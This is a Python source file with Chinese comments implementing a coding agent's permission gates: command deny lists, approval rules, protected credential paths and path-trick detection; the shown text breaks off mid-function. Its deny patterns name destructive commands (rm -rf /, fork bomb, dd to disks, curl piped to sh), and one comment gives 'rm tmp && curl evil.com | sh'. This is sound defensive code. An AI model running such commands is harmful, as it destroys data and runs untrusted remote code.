"""权限系统：命令黑名单 + 路径白名单 + 用户审批。

大白话：AI 每次要跑命令、读写文件之前，都要先过这里的检查——就像小区
保安，一道道关卡问"你干什么的、有没有证"。这个文件是整个项目安全机制
的地基，被所有工具（terminal、write_file 等）依赖；它自己不依赖上层
任何模块。

关卡从先到后（前面的先拦）：
  闸门 0：不可绕过的底线（改自身代码、rm -rf / 这类灾难）——任何模式都拒
  闸门 1：硬拒绝黑名单（sudo、格式化磁盘等危险命令）
  闸门 2：破坏性命令模式（rm/del 等会删东西的，要先问用户）
  闸门 3：用户审批（通过 callback 弹出来问，本次会话问过的不重复问）
  闸门 4：aux_llm 分类（副 LLM——一个帮忙干杂活的小模型，让它判断命令
          安不安全；由 feature flag 开关控制，默认关）

各层的价值：
- 黑名单（闸门 1）是零成本防线，先挡住灾难性误操作；
- 路径白名单保护用户文件和密钥（写文件只准写工作目录和 ~/.codeAgent）；
- 审批给用户最终决定权，会话内缓存避免同一个问题反复问；
- LLM 分类（闸门 4）是可选的"慢速深审"：前三关都放过了、也不在破坏性
  模式里的命令，再让副 LLM 从语义上判一次。配置里的白名单命令直接走
  快速通道（ls/cat/git status 这类明显安全的，0 次 LLM 调用）。容错方式
  是 fail-open（AI 调用失败就放行，别把用户卡死）。
  分类结果有三个方向（allow 放行 / deny 拒绝 / ask 升人工审批
  ——拿不准时问人，不直接拒），还支持 settings.json permissions.nl_rules
  里的自然语言规则（如"不允许动 docker"），会拼进分类提示词里，优先级
  最高、逐条对照。
"""
import asyncio
import json
import logging
import os
import re
import sys
import threading
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple

from agent.atomic_io import atomic_write_text
from agent.bash_injection import check_injection_surface
# 只读命令判定表拆到独立模块（纯搬迁）；re-export 保外部 from-import 契约
from agent.readonly_commands import (  # noqa: F401
    is_readonly_command,
)
# 闸门 4 的 LLM 分类辅助拆到独立模块（纯搬迁）；re-export 保类内引用契约
from agent.permission_llm import (  # noqa: F401
    LLM_DENIAL_MAX_CONSECUTIVE,
    LLM_DENIAL_MAX_TOTAL,
    _classify_bash_command,
    _is_dangerous_whitelist_entry,
    _matches_whitelist,
)


# ---------------------------------------------------------------------------
# 检查结果类型（所有闸门统一返回这个）
# ---------------------------------------------------------------------------
logger = logging.getLogger(__name__)
@dataclass
class PermissionResult:
    """一次权限检查的结果：允不允许、为什么、是哪道关卡给的结论。"""
    allowed: bool
    reason: str
    gate: str = ""  # 给出结论的关卡："deny" / "protected" / "approval" / "ok" 等


# ---------------------------------------------------------------------------
# 闸门 1：命令硬拒绝黑名单
# ---------------------------------------------------------------------------

# 每条 (正则, 拒绝说明)。正则按忽略大小写匹配。
_DENY_COMMAND_PATTERNS: List[Tuple[str, str]] = [
    # 删除根目录/家目录
    (r"\brm\s+-rf?\s+/(?:\s|$|\*)", "rm -rf 根目录"),
    (r"\brm\s+-rf?\s+~(?:\s|$|\*)", "rm -rf home 目录"),
    (r"\brm\s+-rf?\s+\*\s*$", "rm -rf 通配符"),
    # 提权
    (r"\bsudo\b", "sudo 提权"),
    (r"\bsu\s+-\s*\w", "su 切换用户"),
    # 磁盘破坏
    (r"\bmkfs\b", "格式化文件系统"),
    (r"\bdd\s+if=.*of=/dev/", "dd 写设备文件"),
    (r">\s*/dev/sd[a-z]", "覆盖磁盘设备"),
    # fork bomb
    (r":\(\)\s*\{[^}]*\};", "fork bomb"),
    # 系统控制
    (r"\b(?:shutdown|reboot|halt|poweroff)\b", "关机/重启"),
    (r"\bsystemctl\s+(?:stop|disable)", "停止/禁用系统服务"),
    # Windows 破坏
    (r"\bformat\s+[A-Z]:", "format 磁盘"),
    (r"\bdel\s+/[A-Z]*[fs].*\\(?:Windows|Program Files|System32)", "删除 Windows 系统目录"),
    (r"Remove-Item.*-Recurse.*-Force.*\\(?:Windows|Program)", "PowerShell 强删系统目录"),
    (r"\brmdir\s+/s.*\\(?:Windows|Program)", "rmdir /s 删系统目录"),
    # 权限乱改
    (r"\bchmod\s+-R\s+[0-7]+\s+/\s*$", "全盘改权限"),
    (r"\bchown\s+-R\s+.*\s+/\s*$", "全盘改属主"),
    # 危险管道（远程脚本直接执行）
    (r"\bcurl\s+[^|]*\|\s*(?:ba)?sh", "curl 管道执行远程脚本"),
    (r"\bwget\s+[^|]*\|\s*(?:ba)?sh", "wget 管道执行远程脚本"),
    # 覆盖关键系统文件
    (r">\s*/etc/(?:passwd|shadow|sudoers)", "覆盖系统认证文件"),
    # git 危险操作（强推主分支，两种参数顺序都匹配）
    (r"\bgit\s+push\b.*(?:--force|-f)\b.*\b(?:main|master)\b", "强推主分支"),
    (r"\bgit\s+push\b.*\b(?:main|master)\b.*(?:--force|-f)\b", "强推主分支"),
]
# 模块加载时预编译成正则对象（省得每次 check 都重新编译）
_DENY_COMMAND_PATTERNS_COMPILED: List[Tuple["re.Pattern", str]] = [
    (re.compile(pat, re.IGNORECASE), desc)
    for pat, desc in _DENY_COMMAND_PATTERNS
]


def check_command_deny(command: str) -> Optional[str]:
    """闸门 1：检查命令是否命中硬拒绝黑名单（命中就直接拒，不问用户）。

    参数：
        command: 待检查的 shell 命令字符串。

    返回：命中时返回那条黑名单的说明文字（可作为拒绝原因展示）；
    没命中返回 None。
    """
    for pattern, desc in _DENY_COMMAND_PATTERNS_COMPILED:
        if pattern.search(command):
            return desc
    return None


# ---------------------------------------------------------------------------
# 自我保护：禁止修改 CodeAgent 自身的依赖（uv add / pip install）
# ---------------------------------------------------------------------------

def check_self_modification(command: str, cwd: Optional[str] = None) -> Optional[str]:
    """闸门 0 的一半：不许 AI 修改 CodeAgent 自己的依赖。

    干什么：AI 在 CodeAgent 自己的代码目录里跑 uv add / pip install 就拒绝。

    为什么需要：AI 改自己的依赖等于"给自己动手术"——pyproject.toml 被改坏
    或 venv 被污染后，整个助手直接瘫痪。只保护 CodeAgent 自己的目录
    （project_root），不限制用户项目：在用户项目里装依赖是干活的正当操作，
    一律放行（用户项目也未必是 Python——前端用 npm/pnpm/yarn，Python 用
    uv/pip）。

    参数：
        command: 待检查的命令字符串。
        cwd: 当前工作目录；不传就跳过检查。

    返回：命中时返回拒绝原因文字，没命中返回 None。
    """
    if not cwd:
        return None
    try:
        from constants import project_root
        root = project_root().resolve()
        cwd_resolved = Path(cwd).resolve()
    except Exception:
        return None

    # 只在 CodeAgent 自己的目录里才拦
    in_self = cwd_resolved == root
    if not in_self:
        try:
            cwd_resolved.relative_to(root)
            in_self = True
        except ValueError:
            pass
    if not in_self:
        return None

    if re.search(r"\buv\s+add\b", command, re.IGNORECASE):
        return "在 CodeAgent 自身目录内 uv add 会修改自身依赖(pyproject.toml),禁止 agent 操作"
    if re.search(r"\bpip\d?\s+install\b", command, re.IGNORECASE):
        return "在 CodeAgent 自身目录内 pip install 会污染自身 venv,禁止 agent 操作"
    return None


# ---------------------------------------------------------------------------
# 不可绕过的系统级破坏（即使 bypassPermissions 也拒）
# ---------------------------------------------------------------------------
# 这组模式与上面的 _DENY_COMMAND_PATTERNS 的区别:
# - _DENY_COMMAND_PATTERNS(闸门 1) 在 bypassPermissions(跳过所有审批)模式下不生效
# - _FATAL_IRREVERSIBLE_PATTERNS(闸门 0 的子检查) 任何模式下都拒绝——
#   是绕不过去的"硬底线",保住系统不被彻底搞坏
_FATAL_IRREVERSIBLE_PATTERNS: List[str] = [
# rm -rf / 根目录(递归删掉整个文件系统)
    # 注意:只能命中"根目录本身",不能误伤 /home、/tmp/x 这类子路径。
    # 拆成两条:第一条要求 rm -rf / 后面紧跟空格或行尾(排除 /home 等非根路径);
    # 第二条专门兜底显式的 --no-preserve-root(都写这个参数了,无论后面跟
    # 什么都是致命操作)。
    r"\brm\s+-rf\s+/(?:\s|$)",
    r"\brm\s+-rf\s+/\s+--no-preserve-root",
    r"\bmkfs\b",                                    # mkfs 格式化文件系统
    r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;",        # fork bomb :(){ :|:& };(自我复制的死循环,拖垮整机;容忍空格变体)
    r"\bdd\s+if=.*of=/dev/[sh]d",                   # dd 直接往物理磁盘设备写数据(整盘覆盖)
]
_FATAL_IRREVERSIBLE_RE: List["re.Pattern"] = [
    re.compile(p) for p in _FATAL_IRREVERSIBLE_PATTERNS
]


def check_fatal_irreversible(command: str) -> Optional[str]:
    """检查系统级不可逆破坏命令(bypassPermissions 也绕不过去)。

    干什么:比对硬底线黑名单——整个权限系统里唯一"绝对不可绕过"的检查。

    为什么需要:即使用户选了"跳过所有审批"的 bypassPermissions 模式,
    这些命令也要拒,因为后果无法挽回:
    - 整个文件系统被删(rm -rf /)
    - 文件系统被格式化(mkfs)
    - 系统资源被 fork bomb 耗尽
    - 物理磁盘数据被覆盖(dd)

    参数:
        command: 待检查的命令字符串。

    返回:命中返回拒绝原因文字,没命中返回 None。
    """
    for pat in _FATAL_IRREVERSIBLE_RE:
        if pat.search(command):
            return f"系统级不可逆命令（任何模式都拒绝）: {command}"
    return None


# ---------------------------------------------------------------------------
# acceptEdits 模式:识别"安全的文件操作命令"(mkdir/touch/mv/cp/rm/del 且都在工作目录内)
# ---------------------------------------------------------------------------
# acceptEdits(自动批编辑)模式下可以自动放行的文件操作动词
_SAFE_FS_VERBS = {"mkdir", "touch", "mv", "cp", "rm", "del"}

# shell 复合操作符守卫:复合命令风险高,acceptEdits 不自动批
# (例:``rm tmp && curl evil.com | sh`` 的动词是 "rm",在安全表里,但后面的
# curl 部分照样会被 shell 执行)。这种命令必须交回原审批闸门。
# 另追加:${ / <( / >( / =(（注入面形态——rm ${X} 展开后的目标不受
# "必须在工作目录内"这条校验控制,进程替换更是直接执行子 shell）,acceptEdits 不自动批。
_SHELL_OPS = ("&&", "||", ";", "|", "`", "$(", "${", "<(", ">(", "=(")


def _is_safe_fs_in_cwd(command: str, cwd: Optional[str]) -> bool:
    """acceptEdits 模式用:判断命令是不是"安全的文件操作"可以自动批。

    干什么:命令动词是 mkdir/touch/mv/cp/rm/del 之一,且所有路径参数都落在
    当前工作目录(cwd)里面,才算安全。

    为什么需要:acceptEdits 模式的本意是"AI 连续改代码时别每条都问"——
    在工作目录里建/移/删文件是日常操作;但一旦出了工作目录就必须问。

    参数:
        command: 待检查的命令字符串。
        cwd: 当前工作目录。

    返回:True 表示可以自动批。以下情况一律返回 False(保守优先,交给原闸门):
    - 命令为空或没有 cwd;
    - 含 shell 复合操作符(&&/||/;/|/反引号/$() 等,后半段可能藏危险动作);
    - 任何一个路径解析失败、或在 cwd 外。
    """
    if not command or not cwd:
        return False
    if any(op in command for op in _SHELL_OPS):
        return False
    parts = command.split()
    if not parts:
        return False
    # 取命令动词(兼容 /usr/bin/mkdir 这种绝对路径形式,只留最后一段)
    verb = parts[0].replace("\\", "/").split("/")[-1].lower()
    if verb not in _SAFE_FS_VERBS:
        return False
    try:
        cwd_path = Path(cwd).resolve()
    except (OSError, ValueError):
        return False
    for tok in parts[1:]:
        if tok.startswith("-"):
            continue  # 是选项参数(如 -rf、-p),不是路径,跳过
        if not tok:
            continue
        try:
            # shell 会展开 ~ / $HOME 等，Python 侧判定必须
            # 同样展开——否则 Path("~/x") 算相对路径落在 <cwd>/~/x 下被自动批，
            # 实际执行目标却是家目录（acceptEdits 下无审批删家目录）。
            # 展开后仍含 $（未定义变量，shell 展开结果不可预知）→ 保守不自动批。
            expanded = os.path.expandvars(os.path.expanduser(tok))
            if "$" in expanded:
                return False
            p = Path(expanded)
            resolved = p.resolve() if p.is_absolute() else (cwd_path / p).resolve()
            resolved.relative_to(cwd_path)  # 不在 cwd 下会抛 ValueError
        except (ValueError, OSError, RuntimeError):
            return False  # 路径在 cwd 外或解析失败 → 保守起见不自动批
    return True


# ---------------------------------------------------------------------------
# 闸门 2：破坏性命令模式（需用户审批才能执行）
# ---------------------------------------------------------------------------

# 这些命令本身不算灾难(够不上硬拒绝黑名单),但会删/覆盖文件,
# 应该先问用户。审批 callback 由 cli.py 注入(在终端里问 y/n)。
_DESTRUCTIVE_PATTERNS: List[Tuple[str, str]] = [
    (r"\brm\s+(?!-rf?\s+/(?:\s|$|\*))(?!-rf?\s+~)", "rm 删除"),  # rm,但排除根目录/家目录(那俩在更前面的闸门)
    (r"\bdel\s+", "del 删除"),
    (r"\brmdir\s+", "rmdir 删目录"),
    (r"\berase\s+", "erase 删除"),
    (r"\bRemove-Item\b", "PowerShell Remove-Item"),
    (r"\bshred\s+", "shred 安全删除"),
    (r"\btruncate\s+-s\s*0", "truncate 清空文件"),
    (r"\bgit\s+reset\s+--hard", "git reset --hard 丢弃改动"),
    (r"\bgit\s+clean\s+-[fxd]", "git clean 删未跟踪文件"),
]
_DESTRUCTIVE_PATTERNS_COMPILED: List[Tuple["re.Pattern", str]] = [
    (re.compile(pat, re.IGNORECASE), desc)
    for pat, desc in _DESTRUCTIVE_PATTERNS
]


def check_destructive(command: str) -> Optional[str]:
    """闸门 2:检查命令是否是破坏性操作(是就要先问用户)。

    参数:
        command: 待检查的命令字符串。

    返回:命中返回匹配到的说明文字(展示给用户的审批理由),没命中返回 None。
    """
    for pattern, desc in _DESTRUCTIVE_PATTERNS_COMPILED:
        if pattern.search(command):
            return desc
    return None


# ---------------------------------------------------------------------------
# 受保护路径（读写都拒绝）
# ---------------------------------------------------------------------------

_PROTECTED_PATHS = [
    # SSH / AWS / GPG 密钥
    "~/.ssh",
    "~/.aws",
    "~/.gnupg",
    # CLI 凭证
    "~/.config/gh",        # GitHub CLI token
    "~/.docker",           # docker credentials
    "~/.kube",             # kubernetes 凭证
    # Unix 系统目录
    "/etc",
    "/usr",
    "/bin",
    "/sbin",
    "/boot",
    "/proc",
    "/sys",
    "/dev",
    # Windows 系统目录
    "C:\\Windows",
    "C:\\Program Files",
    "C:\\Program Files (x86)",
]
# 模块加载时预先算好绝对路径(免得每次 safe_path 都重复对 14 条路径做 resolve)
_PROTECTED_PATHS_RESOLVED: List[Tuple[Path, str]] = []
for _p in _PROTECTED_PATHS:
    try:
        _PROTECTED_PATHS_RESOLVED.append((Path(_p).expanduser().resolve(), _p))
    except (OSError, ValueError):
        # 解析失败的条目跳过(极少数环境下才发生)
        continue


def _path_forms_for_check(path) -> List[Path]:
    """双路径检查:算出这个路径要过安全检查的"两种写法"。

    干什么:同一个路径,给出两个候选形式——
    「原始写法」(只做 ~ 展开和 normpath 规范化,不解析软链)和
    「真实写法」(realpath,把软链一路展开到最终指向)。

    为什么需要:
    - 防软链绕过:表面路径无害,实际软链指向 ~/.ssh 这类保护目标,
      只有"真实写法"能暴露;
    - 反向防护:解析后脱离了保护表、但原始写法还在保护下的形态;
    - 原始写法还能兜底 realpath 失败(比如目标不存在)时保护判定失灵。

    参数:
        path: 任意可转成字符串的路径。

    返回:候选路径列表(两种写法相同时只有一个)。解析整体失败返回空列表
    (与旧的 fail-open 语义一致——但注意写路径在 safe_path 的白名单处
    解析失败仍会 fail-closed 拒绝)。
    """
    forms: List[Path] = []
    try:
        p = Path(path).expanduser()
    except (OSError, ValueError, RuntimeError):
        return forms
    try:
        lexical = Path(os.path.normpath(str(p)))
    except (OSError, ValueError):
        lexical = p
    forms.append(lexical)
    try:
        resolved = Path(os.path.realpath(str(p)))
        if resolved != lexical:
            forms.append(resolved)
    except (OSError, ValueError):
        pass
    return forms


def is_protected_path(path) -> Optional[str]:
    """检查路径是否撞上受保护列表(读写都拒)。

    干什么:拿路径的两种写法(见 _path_forms_for_check)逐条对照保护表。

    为什么需要:保护 ~/.ssh、/etc、C:\\Windows 这类碰不得的地方;两种
    写法都查(防软链绕过——软链指向 ~/.ssh 时只有 realpath 形式
    会暴露)。

    参数:
        path: 待检查的路径。

    返回:命中时返回保护表里的原始条目(如 "~/.ssh",可作拒绝原因展示),
    没命中返回 None。
    """
    for form in _path_forms_for_check(path):
        for prot, orig in _PROTECTED_PATHS_RESOLVED:
            if form == prot:
                return orig
            # path 落在保护目录的下层子路径里也算命中
            try:
                form.relative_to(prot)
                return orig
            except ValueError:
                continue
    return None


# ---------------------------------------------------------------------------
# 写保护路径(只禁写,不禁读——AI 可以读 CodeAgent 的项目代码,但不能改)
# ---------------------------------------------------------------------------

_WRITE_PROTECTED_PATHS: List[Tuple[Path, str]] = []
try:
    from constants import project_root
    _WRITE_PROTECTED_PATHS.append((project_root().resolve(), "项目代码目录"))
except Exception:
    pass


def is_write_protected_path(path) -> Optional[str]:
    """检查路径是否在写保护列表(只禁写,不禁读)。

    干什么:判断路径是否落在 CodeAgent 自身代码目录里。

    为什么需要:防 AI 改自己的源码(相当于自我篡改)。路径的两种
    写法(词法/realpath)都过保护表,防软链绕过。

    参数:
        path: 待检查的路径。

    返回:命中返回保护项说明文字,没命中返回 None。
    """
    for form in _path_forms_for_check(path):
        for prot, orig in _WRITE_PROTECTED_PATHS:
            if form == prot:
                return orig
            try:
                form.relative_to(prot)
                return orig
            except ValueError:
                continue
    return None


# ---------------------------------------------------------------------------
# 可疑路径形态检测(各种"改名绕过安检"的花招,全平台都查)
# ---------------------------------------------------------------------------

# 8.3 短名(WINDOWS 的老式缩写文件名,如 GIT~1 / SETTIN~1.JSON——和全名
# 指向同一个文件,但字符串对不上,能绕过按名字匹配的检查)
_SHORT_NAME_RE = re.compile(r"~\d")
# 长路径前缀(\\\\?\\ / \\\\.\\ 及正斜杠变体——能突破 260 字符限制,
# 也让按前缀/后缀匹配的检查失效)
_LONG_PATH_PREFIXES = ("\\\\?\\", "\\\\.\\", "//?/", "//./")
# 尾点/尾空格(Windows 解析时会把结尾的点和空格悄悄剥掉——
# ".git." 实际就是 ".git",但字符串匹配对不上)
_TRAILING_DOT_SPACE_RE = re.compile(r"[.\s]+$")
# DOS 设备名当扩展名(.git.CON / settings.json.PRN / .bashrc.AUX——
# 这些老设备名在 WINDOWS 里有特殊含义,解析行为不可预期)
_DOS_DEVICE_EXT_RE = re.compile(
    r"\.(?:CON|PRN|AUX|NUL|COM[1-9]|LPT[1-9])$", re.IGNORECASE
)
# 三连点及以上的独立路径段(.../file.txt 或 path/.../file;
# 只拦"前后都是分隔符或端点"的完整段,放过 [...] 这种合法文件名)
_TRIPLE_DOT_SEGMENT_RE = re.compile(r"(?:^|[/\\])\.{3,}(?:[/\\]|$)")
# 波浪变体(~user / ~+ / ~- / ~N——凡是不是 "~" 或 "~/" 开头的波浪形态;
# shell 展开的目标(~root → /var/root)和校验时当相对路径看的目标不一致)
_TILDE_VARIANT_RE = re.compile(r"^~(?![/\\]|$)")
# glob 通配符(写路径禁止:写工具按字面用路径,通配符只会被用来绕过校验)
_GLOB_META_RE = re.compile(r"[*?\[\]{}]")


def check_suspicious_path(path, *, write: bool = False) -> Optional[str]:
    """检测可用于绕过安全检查的可疑路径形态(查到就拒)。

    干什么:看路径字符串里有没有"改名绕过安检"的花招(NTFS 特性、
    短文件名、尾点等)。

    为什么需要:就算保护表和白名单都写对了,这些特殊写法能让同一个
    文件呈现出完全不同的字符串,安检就对不上了。检查范围包括 NTFS
    花招、波浪变体、写路径 glob 禁令,且**全平台都查**(NTFS 磁盘可以
    挂载在任何系统上,这些花招在 Linux/macOS 的 ntfs-3g 挂载下一样好使):
    - NTFS ADS 冒号(file.txt:stream,仅 win32——POSIX 里冒号是合法
      文件名字符,不能拦)
    - 8.3 短名(GIT~1)
    - 长路径前缀(\\\\?\\ / \\\\.\\)
    - 尾点/尾空格(Windows 解析时剥掉)
    - DOS 设备名扩展(CON/PRN/AUX/NUL/COM1-9/LPT1-9)
    - 三连点路径段(.../file)
    - UNC 路径(\\\\server\\share——访问远程资源 + 可能泄露凭证 +
      绕过工作目录限制)
    - 波浪变体(~user / ~+ / ~N)
    - glob 通配符(仅写路径;读路径的通配符由 glob 工具自己展开)

    参数:
        path: 待检查的路径。
        write: 是否写操作(写操作额外拦通配符)。

    返回:命中返回中文拒绝原因,没命中返回 None。
    """
    try:
        s = str(path)
    except Exception:
        return None
    if not s:
        return None

    # 长路径前缀要先于 ADS 冒号检查(\\?\C:\ 里的冒号是盘符,不是 ADS)
    if s.startswith(_LONG_PATH_PREFIXES):
        return "长路径前缀（\\\\?\\ / \\\\.\\）"
    # NTFS ADS 冒号:跳过盘符冒号(C:\ 的冒号在位置 1),从位置 2 起找
    if sys.platform == "win32" and s.find(":", 2) != -1:
        return "NTFS ADS 冒号形态（file:stream）"
    if _SHORT_NAME_RE.search(s):
        return "8.3 短名形态（NAME~1）"
    # 尾点/尾空格:只看最后一个路径段(裸 "."/".." 是目录引用,放行)
    _last_seg = re.split(r"[/\\]", s)[-1]
    if _last_seg and _last_seg not in (".", "..") and _TRAILING_DOT_SPACE_RE.search(_last_seg):
        return "尾点/尾空格（Windows 解析时剥离，可绕过路径匹配）"
    if _DOS_DEVICE_EXT_RE.search(s):
        return "DOS 设备名扩展（CON/PRN/AUX/NUL/COM/LPT）"
    if _TRIPLE_DOT_SEGMENT_RE.search(s):
        return "三连点路径段（...）"
    if s.startswith("\\\\") or s.startswith("//"):
        return "UNC 路径（网络资源访问）"
    if _TILDE_VARIANT_RE.match(s):
        return "波浪变体（~user / ~+ / ~N，shell 展开目标与校验目标不一致）"
    if write and _GLOB_META_RE.search(s):
        return "写路径含 glob 元字符（写工具按字面使用路径）"
    return None


# ---------------------------------------------------------------------------
# 路径白名单（写操作检查）
# ---------------------------------------------------------------------------

# 运行时额外白名单(用户用 /add-dir 命令追加的目录;只活在当前进程,
# 重启后靠 settings.json 持久化 + 启动加载恢复)。
# 注意:受保护路径(~/.ssh / /etc 等)和项目代码写保护在 safe_path 里排在
# 白名单**前面**——往白名单加目录不能绕过这些硬底线(安全默认优先,
# 出了事再补救就晚了)。
_EXTRA_ALLOWED_ROOTS: List[Path] = []


def add_extra_allowed_root(root) -> bool:
    """运行时往写白名单追加一个根目录(已存在就不再加,幂等)。

    参数:
        root: 要追加的目录路径。

    返回:True 表示新加了一条;False 表示它已经在白名单里(去重)。
    """
    resolved = Path(root).expanduser().resolve()
    if resolved in _EXTRA_ALLOWED_ROOTS:
        return False
    _EXTRA_ALLOWED_ROOTS.append(resolved)
    return True


def list_extra_allowed_roots() -> List[Path]:
    """列出运行时追加的额外白名单(返回拷贝,外部改不到内部列表)。"""
    return list(_EXTRA_ALLOWED_ROOTS)


def clear_extra_allowed_roots() -> None:
    """清空运行时额外白名单（测试用）。"""
    _EXTRA_ALLOWED_ROOTS.clear()


def remove_extra_allowed_root(root) -> bool:
    """运行时从额外白名单里移除一条（/approved remove-root 命令用）。

    参数:
        root: 要移除的目录路径。

    返回:True 表示移除成功;False 表示它本来就不在白名单里。
    """
    resolved = Path(root).expanduser().resolve()
    if resolved in _EXTRA_ALLOWED_ROOTS:
        _EXTRA_ALLOWED_ROOTS.remove(resolved)
        return True
    return False


def default_allowed_roots() -> List[Path]:
    """算出默认允许写入的根目录列表:工作目录 + ~/.codeAgent + /add-dir 追加的额外白名单。

    为什么是这三处:工作目录是用户项目的地盘,~/.codeAgent 是 AI 自己的家
    (记忆/技能等数据),/add-dir 是用户显式授权的额外目录。

    工作目录必须用 get_workspace_cwd() 取而不是 Path.cwd()——后者是
    进程级的(等于 os.getcwd),多个子代理(主对话派出去干活的分身)并发
    跑时,一个切了目录,别的都会踩到别人的工作目录;前者是线程私有的
    ContextVar 变量:子代理在自己的 worktree(git 工作副本)里写文件时,
    白名单里包含的是它自己的 worktree 路径,不会被 safe_path 误拒。

    返回:Path 列表(无参数)。
    """
    from agent.workspace_context import get_workspace_cwd
    roots = [Path(get_workspace_cwd()).resolve()]
    try:
        from constants import get_codeagent_home
        roots.append(get_codeagent_home().resolve())
    except Exception:
        pass
    # /add-dir 运行时追加的额外白名单(含启动时从
    # settings.json 里加载回来的)
    roots.extend(_EXTRA_ALLOWED_ROOTS)
    return roots


def safe_path(
    path,
    *,
    write: bool = False,
    allowed_roots: Optional[List] = None,
) -> PermissionResult:
    """检查一个路径是否允许访问(模块级函数版,不带审批;要弹窗问用户的走 PermissionChecker.check_path)。

    干什么:按顺序过三关——可疑形态、受保护路径、(写操作时)写保护+白名单。

    规则:
    - 读:不在 _PROTECTED_PATHS(密钥/系统目录)里就放行;
    - 写:不在 _PROTECTED_PATHS、不在写保护目录(项目自身代码),且落在
      allowed_roots 之一里面,三者都满足才放行。

    参数:
        path: 待检查的路径。
        write: 是否写操作(默认 False 只读)。
        allowed_roots: 允许写入的根目录列表;不传就用默认
            (工作目录 + ~/.codeAgent + 额外白名单)。

    返回:PermissionResult(含允许与否、原因、给出结论的关卡)。
    """
    # 可疑路径形态先查(读写都查,查到就拒——防止绕过下面两道检查)
    susp = check_suspicious_path(path, write=write)
    if susp:
        return PermissionResult(False, f"可疑路径形态: {susp}", "suspicious")

    # 再查受保护路径(读写都拒)
    prot = is_protected_path(path)
    if prot:
        return PermissionResult(False, f"受保护路径: {prot}", "protected")

    if not write:
        return PermissionResult(True, "ok", "ok")

    # 写保护路径(只禁写:CodeAgent 项目自身代码目录)
    wprot = is_write_protected_path(path)
    if wprot:
        return PermissionResult(
            False,
            f"写保护(项目代码保护,不允许修改): {wprot}",
            "protected",
        )

    # 写操作最后过白名单
    if allowed_roots is None:
        allowed_roots = default_allowed_roots()
    allowed_roots = [Path(p).resolve() for p in allowed_roots]

    try:
        resolved = Path(path).expanduser().resolve()
    except (OSError, ValueError) as e:
        return PermissionResult(False, f"路径解析失败: {e}", "protected")

    for root in allowed_roots:
        try:
            if resolved == root:
                return PermissionResult(True, "白名单内", "ok")
            resolved.relative_to(root)
            return PermissionResult(True, "白名单内", "ok")
        except (OSError, ValueError):
            # OSError 和 ValueError 要合并在一个 except 里
            # ——写成两段连续的 except 时,第二段是死代码(轮不到执行)
            continue

    return PermissionResult(
        False,
        f"写入路径不在白名单: {resolved}（允许: {allowed_roots}）",
        "protected",
    )


# ---------------------------------------------------------------------------
# 危险删除路径判定(对 rm/rmdir/del/erase/rd 的目标参数做专项检查)
# ---------------------------------------------------------------------------

# Windows 盘根(C: 或 C:/)
_WIN_DRIVE_ROOT_RE = re.compile(r"^[A-Za-z]:/?$")
# Windows 盘根的直接子目录(C:/Windows、C:/Users)
_WIN_DRIVE_CHILD_RE = re.compile(r"^[A-Za-z]:/[^/]+$")


def is_dangerous_removal_path(resolved_path) -> bool:
    r"""判断删除命令的目标路径是不是"删不得"的地方。

    为什么要单独查:rm 一个普通文件和 rm 整个 /usr 完全是两回事,
    前者可以审批,后者想都别想。危险目标:
    - 裸通配符 *(删掉目录下全部内容)/ 任何以 /* 结尾的路径;
    - 根目录 /;
    - 家目录;
    - 根目录的直接子目录(/usr、/tmp、/etc——但 /usr/local 不算,它更深一层);
    - Windows 盘根(C:\)和盘根直接子目录(C:\Windows、C:\Users)。

    参数:
        resolved_path: 已解析成绝对路径的删除目标。

    返回:True 表示这个目标删不得。
    """
    s = re.sub(r"[\\/]+", "/", str(resolved_path))

    if s == "*" or s.endswith("/*"):
        return True

    normalized = s if s == "/" else (s.rstrip("/") or "/")
    if normalized == "/":
        return True
    if _WIN_DRIVE_ROOT_RE.match(normalized):
        return True

    home = re.sub(r"[\\/]+", "/", str(Path.home()))
    if normalized.lower() == home.lower():
        return True

    # 根目录的直接子目录:/usr、/tmp(父目录就是 / 的那一层)
    if normalized.startswith("/"):
        parts = normalized.lstrip("/").split("/")
        if len(parts) == 1 and parts[0]:
            return True

    if _WIN_DRIVE_CHILD_RE.match(normalized):
        return True
    return False


# 删除类动词(看命令第一个词;Remove-Item 不在此列,它由闸门 2 的
# 破坏性审批兜底)
_REMOVAL_VERBS = frozenset({"rm", "rmdir", "del", "erase", "rd"})
# 复合命令切段正则(与只读通道的 _COMPOUND_SPLIT_RE 同款)。
# 要补上 & 后台分隔和 \r\n 换行——否则 "echo hi\nrm -rf /"
# 会被当成一段,动词是 echo,危险的后半段漏过本闸门
_CMD_SEGMENT_SPLIT_RE = re.compile(r"&&|\|\||;|\||&|\r|\n")

# 复合命令段数上限(防 DoS——恶意/异常生成的超长复合命令会把
# 安全检查拖到卡死,上限取 50)。超限直接
# 升审批,不进任何解析路径
_MAX_COMPOUND_SEGMENTS = 50


def _has_cd_git_combo(command: str) -> bool:
    """复合命令里 cd 之后再出现 git(含 xargs git)就返回 True。

    为什么要抓这个组合:cd 进一个攻击者可控的目录再跑 git——恶意构造的
    bare repo(裸仓库)可以通过 core.fsmonitor 之类的配置注入执行任意命令。
    顺序敏感:git 在 cd **之前**跑,
    操作的是原目录,不构成这个攻击面,返回 False。

    参数:
        command: 完整命令字符串。

    返回:True 表示存在"cd 之后的 git"。
    """
    segs = _CMD_SEGMENT_SPLIT_RE.split(command)
    if len(segs) < 2:
        return False
    saw_cd = False
    for seg in segs:
        toks = seg.split()
        if not toks:
            continue
        verb = toks[0].lower().strip("\"'")
        if verb == "cd":
            saw_cd = True
            continue
        if verb == "git" or (verb == "xargs" and "git" in toks):
            if saw_cd:
                return True
    return False
# Windows del/rd 的斜杠式选项(/s /q);注意别把 /usr 这种真路径也当成选项
_CMD_FLAG_RE = re.compile(r"^-[A-Za-z]*$|^/[A-Za-z]?$")


def check_dangerous_removal(command: str, cwd: Optional[str] = None) -> Optional[str]:
    """rm/del 类删除命令的目标是危险路径 → 拒。

    什么时候拒:在 default/acceptEdits/autoDeny 三种模式下都拒,而且
    **不接受审批解锁**——用户手滑点了 y/n 正是这类检查要防的事故。
    (它不算 fatal 底线:bypassPermissions 模式下仍然放行,区别于
    rm -rf / 那种任何模式都拒的。)

    参数:
        command: 完整命令字符串(复合命令会逐段检查)。
        cwd: 当前工作目录,相对路径以它为基准;不传用 os.getcwd()。

    返回:命中返回拒绝原因文字,没命中返回 None。
    """
    if not command:
        return None
    base_dir = cwd or os.getcwd()
    for seg in _CMD_SEGMENT_SPLIT_RE.split(command):
        toks = seg.split()
